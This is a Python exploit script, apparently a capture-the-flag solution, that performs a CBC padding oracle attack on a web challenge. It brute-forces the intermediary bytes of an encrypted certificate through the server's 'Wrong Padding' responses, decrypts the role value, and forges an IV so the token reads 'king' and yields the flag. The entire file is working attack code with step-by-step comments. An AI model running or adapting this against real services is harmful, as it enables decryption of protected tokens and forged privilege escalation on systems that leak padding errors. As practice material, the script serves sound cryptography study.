#! Python 3.10.0

import requests
from bs4 import BeautifulSoup as bs
import base64

url = 'http://x.ozetta.net/example.php'

ses = requests.Session()
res = ses.get(url)
soup = bs(res.text, 'html.parser')

# b64cert = base64(Initial Vector) + base64(Ciphertext)
# ex1) b64cert = 'UH2ho1ZofOA=8EwVa3Yq+kc='
b64cert = soup.select_one('body > form:nth-child(3) > textarea').get_text()

# Split b64cert into initv and ct.
# ex1) initv = 'UH2ho1ZofOA=', ct = '8EwVa3Yq+kc='
initv = b64cert[:b64cert.index('=') + 1].encode()
ct = b64cert[b64cert.index('=') + 1:].encode()

# Default BLOCK SIZE is 8.
BLOCK_SIZE = 8
brute_iv = bytearray(BLOCK_SIZE)    # brute_iv = b'\x00' * 8

print("[+] Padding Oracle Attack Phase Start")
# Initialize Intermediary Value list.
imV_list = []
for i in range(BLOCK_SIZE):
    for j in range(0xff):
        # Setting Brute force value to brute_iv.
        brute_iv[BLOCK_SIZE - 1 - i] = j
        b64biv = base64.b64encode(brute_iv)
        #print(brute_iv.hex(), b64biv + ct)

        # Sending request.
        data = {'ctf': b64biv + ct}
        res = ses.post(url, data)
        soup = bs(res.text, 'html.parser')
        oracle = soup.find(text="Oracle:").next_element.get_text()

        #print(oracle)

        # If padding is correct, oracle will say "Wrong Class".
        # If padding is not correct, oracle will say "Wrong Padding".
        if "Wrong Padding" in oracle:
            continue

        # We can find Intermediary value now.
        print("[+] imV found!!!")
        imV = j ^ (i + 1)
        imV_list.append(imV)
        print("[+] imV_list: ", imV_list)
        print("="*64)

        # Change last value(s) of brute_iv for not getting padding error.
        for k in range(i + 1):
            brute_iv[BLOCK_SIZE - 1 - k] = imV_list[k] ^ (i + 2)

        # End loop cuz Intermediary Value has been found.
        break

    # If length of imV_list is smaller than (i + 1),
    # it means Intermediary value has not been found.
    # So, end the entire loop.
    if(len(imV_list) < (i + 1)):
        print("[+] imV not found, end loop...")
        break


print("[+] Certificate (Base64): ", b64cert)
print("[+] Final imV_list: ", imV_list[::-1])


initv = base64.b64decode(initv)     # Initial Vector (Byte)

# XOR each Intermediary Value with Initial Vector to get plaintext.
pt = ''
for _a, _b in zip(imV_list[::-1], initv):
    pt += chr(_a ^ _b)
print("[+] Found plaintext: ", pt)        
pt = pt.encode()                    # Plaintext (Str) -> (Byte)

# Generate new plaintext that I want to set.
# In this problem, main purpose was to be a "king" from "citizen".
king = b'gnik' + b'\x04'*4          # New Plaintext (Byte)

# We can get poisoned IV with (Initial Vector) ^ (Found plaintext) ^ (New plaintext).
poisoned_iv = int(initv.hex(), 16) ^ int(pt.hex(), 16) ^ int(king.hex(), 16)
poisoned_iv = bytes.fromhex(format(poisoned_iv, '02x')) # int -> hex -> byte
b64_poisoned_iv = base64.b64encode(poisoned_iv)         # Base64 Encoding

# Send request.
data = {'ctf': b64_poisoned_iv + ct}
res = ses.post(url, data)
soup = bs(res.text, 'html.parser')
oracle = soup.find(text="Oracle:").next_element.get_text()

# Your class is king. Congratulations!
print("[+] Flag: ", oracle)

